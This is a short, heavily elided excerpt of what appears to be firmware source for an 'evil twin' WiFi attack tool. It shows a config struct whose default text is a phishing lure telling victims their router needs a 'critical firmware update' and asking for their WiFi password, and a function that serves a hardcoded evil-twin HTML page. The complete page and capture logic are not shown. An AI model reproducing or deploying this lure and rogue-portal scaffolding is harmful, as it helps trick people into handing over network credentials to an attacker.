...
struct EvilTwinConfig {
  ...
  String body = "Your router requires a critical firmware update.<br><br>Please enter your WiFi password.";
...
// --- ADMIN UI HTML ---
// Generated from html/admin_ui.html at build time.
...
String generateEvilTwinPage() {
  ...
  // Hardcoded Fallback
  return String(FPSTR(EVIL_TWIN_HTML));
}
